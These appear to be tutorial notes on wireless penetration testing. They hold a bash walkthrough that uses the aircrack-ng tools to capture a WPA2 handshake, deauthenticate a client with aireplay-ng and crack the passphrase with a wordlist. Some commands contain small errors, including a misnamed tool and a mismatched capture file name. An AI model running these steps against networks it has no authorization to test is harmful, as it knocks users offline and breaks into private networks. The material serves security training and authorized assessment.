# Wireless Penetration Testing

## Overview

#### Assessment of Wireless Network

* WPA2 PSK
* WPA2 Enterprise

#### Activities Performed

* Evaluating strength of PSK
* Reviewing nearby networks
* Assessing guest networks
* Checking network access

### Tools Being Used

* Wireless Card
* Router
* Laptop

### The Hacking Process (WPA2 PSK)

* Place - Place wireless card into monitor mode
* Discover - Discover information about network: Channel, BSSID
* Select - Select network and capture data
* Perform - Perform deauth attack
* Capture - Capture WPA handshake
* Attempt - Attempt to crack the handshake

## Exploitation Walkthrough

```bash
# First connect VM to wireless card: Player, REmovable Devices, <Card Name>, Connect
iwconfig  # Check if wlan0 exists
airmon-ng check kill  # Allow us to check for any process that are running and kill them that will interfere
airmon-ng start wlan0
iwconfig  # Check for wlan0mon
airodump-ng wlan0mon  # Check for devices around us
# Identify the device (BSSID) to attack and the channel (CH) and do next steps
airodump -c <CH> --bssid <BSSID> -w capture.txt wlan0mon
# Wait for data to be captured, specifically the WPA handshake
# Can also try to deauth to force people to log back in parallel
aireplay-ng -0 1 -a <BSSID> -c <STATION> wlan0mon
# Can now view the capture files and then attempt to crack the handshake
aircrack-ng -w wordlist.txt -b <BSSID> capture.txt.cap
```
